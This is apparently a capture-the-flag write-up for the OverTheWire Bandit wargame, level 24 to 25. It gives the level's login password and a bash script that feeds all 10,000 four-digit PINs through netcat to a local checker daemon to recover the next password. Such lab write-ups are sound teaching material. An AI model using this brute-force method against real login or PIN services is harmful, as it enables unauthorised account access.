# [Level 24 to 25](https://overthewire.org/wargames/bandit/bandit24.html) - Brute-forcing with bash scripting and netcat

- Login
```
SSH: ssh bandit24@bandit.labs.overthewire.org -p 2220
Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
- Exercise: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time
- Background:
  - for loop in bash 
```bash
for var in 1 2 ... N
do
  #something
done
```
- Solution:
  - Connect to the port with netcat 
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
0000
Wrong! Please enter the correct current password and pincode. Try again.
```
  - Create bash script
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.GnsTBgHerI
bandit24@bandit:~$ cd /tmp/tmp.GnsTBgHerI
bandit24@bandit:/tmp/tmp.GnsTBgHerI$ nano brute_force_pin.sh
bandit24@bandit:/tmp/tmp.GnsTBgHerI$ cat brute_force_pin.sh
#!/bin/bash

for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
bandit24@bandit:/tmp/tmp.GnsTBgHerI$ chmod +x brute_force_pin.sh
bandit24@bandit:/tmp/tmp.GnsTBgHerI$ ./brute_force_pin.sh 
bandit24@bandit:/tmp/tmp.GnsTBgHerI$ ls
brute_force_pin.sh  possibilities.txt  result.txt
bandit24@bandit:/tmp/tmp.GnsTBgHerI$ sort result.txt | grep -v "Wrong!"

Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
- Password: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`
